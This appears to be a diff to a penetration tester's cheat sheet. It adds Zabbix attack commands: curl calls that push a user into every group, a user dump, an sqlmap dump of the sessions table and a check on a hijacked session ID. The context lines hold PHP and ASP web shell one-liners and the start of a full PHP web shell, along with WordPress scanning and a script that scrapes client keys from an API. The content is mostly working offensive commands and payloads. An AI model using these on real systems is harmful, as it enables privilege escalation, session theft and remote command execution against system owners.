@@ -161,20 +161,40 @@ tar -xzvf backup.tar.gz -C .
 unzip backup.zip -d .
 
 ## Web
+[*] WordPress
+wpscan --url http://$TARGET/wordpress --enumerate
+Download source > https://develop.svn.wordpress.org/tags/x.x.x/src/
+
+[*] Zabbix
+First, create an API key from the user profile menu.
+Example Auth Key: 97ff641cf1aae09d64d8db4db8674ff0b0f89e6edd5508557cbc295b5fa5e98f
+
++---------- Add Account to All Groups ----------+
+for i in {0..50}; do response=$(curl -s -X POST --url http://$TARGET/zabbix/api_jsonrpc.php --header 'Content-Type: application/json-rpc' --data "{\"jsonrpc\": \"2.0\", \"method\":\"user.update\", \"params\":{\"usrgrps\": [{\"usrgrpid\": $i}], \"userid\": \"3\"},\"auth\":\"97ff641cf1aae09d64d8db4db8674ff0b0f89e6edd5508557cbc295b5fa5e98f\", \"id\": 3}"); [[ $response != *\"error\"* ]] && echo "Group ID: $i"; done
+
++---------- View Users ----------+
+curl -s -X POST --url  http://$TARGET/zabbix/api_jsonrpc.php --header 'Content-Type: application/json-rpc' --data '{"jsonrpc": "2.0", "method":"user.get", "params": {"output": "extend", "status": 0}, "auth":"97ff641cf1aae09d64d8db4db8674ff0b0f89e6edd5508557cbc295b5fa5e98f", "id": 1}' | jq
+
++---------- Dump Active Sessions ----------+
+sqlmap -u "http://$TARGET/zabbix/api_jsonrpc.php" --data='{"jsonrpc":"2.0","method":"user.get","params":{"selectRole":["roleid, *"]},"auth":"97ff641cf1aae09d64d8db4db8674ff0b0f89e6edd5508557cbc295b5fa5e98f","id":1}' --headers="Content-Type: application/json-rpc" --random-agent -D zabbix -T sessions --columns --dump
+
++---------- Verify Session ID ----------+
+curl -X POST http://$TARGET/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc": "2.0","method": "user.checkAuthentication","params": {"sessionid": "fdcfbcb99704cba0bf030d626d671510"},"id": 1}'
+
+
+
+
 [*] Technologies
 whatweb http://$TARGET
 wafw00f http://$TARGET
 
-[*] WordPress
-wpscan --url http://$TARGET/wordpress --enumerate
-Download source > https://develop.svn.wordpress.org/tags/x.x.x/src/
 
 [*] Curl
 cat urls | jq -r 'fromjson | .data-block[] | [.id, .clientName, .identityServerUrl, .url] | @csv'
 cat 000-500 | xargs -P 30 -I{} sh -c 'curl https://api.app.com/workplaces/{} -H "Api-Version: 3.0" -s | jq -r "[.id, .clientName, .clientKey] | @csv"'
 
 [*] Web Shell
-+---------- One Liners ----------+
++---------- CMD Shells ----------+
 PHP
 <?=`$_GET[cmd]`?>
 <?php system($_GET['cmd']); ?>
@@ -190,7 +210,7 @@ Set s = CreateObject("WScript.Shell")
 Set c = s.Exec("cmd /c " & Request("cmd"))
 Response.Write c.StdOut.ReadAll() %>
 
-+---------- PHP ----------+
++---------- Full Shells ----------+
 <html>
 <body style="background: black;color: whitesmoke;font-family: 'Fira Code', 'Consolas', 'Liberation Mono', 'Courier New', monospace;font-size: 15px;margin: 10px 0 0 18px;">
 <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
